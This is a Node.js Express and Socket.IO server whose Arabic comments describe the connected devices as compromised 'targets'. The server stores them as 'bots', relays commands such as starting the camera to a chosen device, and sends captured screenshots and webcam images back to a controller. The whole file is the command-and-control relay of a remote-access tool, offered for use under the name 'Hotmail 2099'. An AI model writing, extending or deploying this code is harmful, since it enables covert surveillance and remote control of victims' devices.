const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, { cors: { origin: "*" } });

app.use(express.static(path.join(__dirname, 'public')));

// قاعدة بيانات مؤقتة للأجهزة المخترقة (المتصلة)
let connectedBots = [];

io.on('connection', (socket) => {
  console.log(`[+] جهاز متصل: ${socket.id}`);

  // تسجيل جهاز جديد كـ "هدف"
  socket.on('register_target', (data) => {
    const botEntry = { id: socket.id, ...data };
    connectedBots.push(botEntry);
    io.emit('update_targets', connectedBots);
  });

  // استقبال أوامر من وحدة التحكم الرئيسية وتوجيهها للهدف
  socket.on('command', (payload) => {
    // payload: { targetId: 'SOCKET_ID', action: 'start_cam', params: {...} }
    io.to(payload.targetId).emit('execute', payload);
  });

  // استقبال نتائج الفحص (لقطات الشاشة، لقطات الكاميرا)
  socket.on('data_response', (data) => {
    // تحويل البيانات إلى جهاز التحكم الرئيسي
    io.emit('incoming_data', data);
  });

  socket.on('disconnect', () => {
    connectedBots = connectedBots.filter(b => b.id !== socket.id);
    io.emit('update_targets', connectedBots);
  });
});

server.listen(3000, () => console.log('⚡ Hotmail 2099 Running on Port 3000'));
